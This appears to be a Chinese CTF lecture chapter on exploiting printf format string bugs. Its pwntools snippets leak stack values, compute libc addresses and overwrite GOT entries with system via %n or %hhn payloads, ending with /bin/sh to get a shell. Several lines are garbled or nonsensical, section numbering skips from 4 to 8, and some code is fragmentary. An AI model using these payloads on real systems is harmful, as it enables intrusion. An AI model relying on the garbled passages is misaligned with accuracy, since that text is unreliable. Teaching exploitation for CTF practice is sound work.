# P6 · 格式化字串漏洞（20 分鐘）

> 大綱獨立列這一章；本章把它視為「Pwn 情境下強大又易註入的 crash 之門」。
> 目標：**leak 棧上的位址（canary/libc/PIE base）→ 覆寫 GOT 為 system → ret2**.

---

## 1 · printf 的真相

```c
printf(user_filled_buffer);       // 漏洞：把「用戶內容」直接當格式字串
printf("%s", user_filled_buffer); // 正確
```

`printf("a")` 的 function 參數實際上是：
`printf(fmt, arg1, arg2, arg3, ...)`

以上第一參數 = user 的字串；**若字串中含 `%`、printf 會去「額外讀取棧上的數據」**。這包括：

| format | 意义 | 初步示例 |
|---|---|---|
| `%p` | 打印 pointer | `printf("%p")` 打棧上的值 |
| `%x` | hex | 同上 |
| `%s` | **解引用** 打印字串 | 若指到不合法 addr → segfault |
| `%n` | **寫入**：把已打印的長度寫入指向的地址 | `%n$`、 `%hhn` |
| `%100x` | padding 製造 100 字元 | 對 `%n` 型寫法必須校準 |
| `%N$p` | **取棧上第 N 個內容** | 這是 64-bit 定位格式化偏移的關鍵 |

> **通通可能 leak 出來**：libc、canary、ret addr、PIE base。

## 2 · 4-mark 定位法（「哪一個棧位置是我的 buffer？」）

```python
# 假設 `io.sendlineafter(b'name: ', b'')`
payload = b'AAAABBBB%7$8p'      # 第 7 個棧項對應到 AAAABBBB
io.sendlineafter(b'name: ', payload)
print(io.recvline())            # 若看到 0x42424242414141 → 我們的資料在第 7 個 slot
```

> 64-bit 程式，前 5 參數在暫存器，從第 6 個棜始是棧上；**大多數 `printf(buffer)` 的 buffer 本身在第 6 個位置**。
> 本講的 `Pwn` 練習 37 中，會明确要求 grep。

## 3 · 用 `%n` 寫 GOT

```python
# 規劃
TARGET = elf.got['puts']
WRITTEN = libc.symbols['system']

# 計算 payload（pwntools 帶 fmtstr_payload 也行）
# 假設偏移 offset 是 6
# 注意 fmtstr_payload 的 sorting 需要 addr 和 val 相同長度，進階
pay = fmtstr_payload(6, {TARGET: WRITTEN})
sendlineafter(b'prompt: ', pay)
# 進函數 entrypoint 之後 GCRW =  system → next 流程便是 `system(@got put)` 形式的突破先參數栓
```

> `fmtstr_payload(offset, writes)` 有 3 個限制：
> 1. 32-bit 與 64-bit 混獲難處理；pwntools 對 64-bit 處理較完善。
> 2. 「寫位址含 `\x00` 的時候」需要 `sort`。
> 3. 有長度上限（大 GOT offset 要 long format）。

**32-bit 手動構造**（每 byte 一個 `%hhn`）：

```python
pay  = b'%' + str(val).encode() + b'c%8$hhn'
pay += b'%' + str(got).encode() + b'c%9$hhn'
```

> 定點補 perimeter 設 set；細節請見 講師在課堂上「手寫 `%hhn+heap` 的例子。

## 4 · 課堂練習實例（講師 detailed demo）

### 4.1 leak libc

```text
- payload: `%39$p`（或 目标 ended process：`%7$p`，在 GDB 檢查）
- 送出 並顯示； leak → 計算 libc base（所需 libc.so.6）
```

### 4.2 GOT overwrite

```python
USEG_GOT = elf.got['printf']  # 這一線性被子例函數 <=2 表達
pay = fmtstr_payload(6, {USEG_GOT: …})
```

> CTF 的典型「格式化字串改 GOT」會把 U GOT 成 `system`，随後未來 `printf(x)` 變 `system(x)`，
> 下輸入值 `/bin/sh` 拿 shell。

> **代價**：`fmtstr_payload` 在 64-bit 下帶6–8 `[4,5] kb* 個`字元 —— 對長度受限題目不利，那用「循環 `%hhn`」自寫。

## 8 · 講師提示

- **不要嘗試 32-bit** 的練習 → 只講 64-bit 情境（賽場 90% 是 64-bit）。
- 講解「**第 6 個位置**」的由來：64-bit 前 5 個參數放暫存器、第 6 個是棧上第一項（配 GDB圖像）。
- `fmtstr_payload` 不能一步到底完成所有時刻；**須搭配自編 ROP 和 Got 2 階段**。
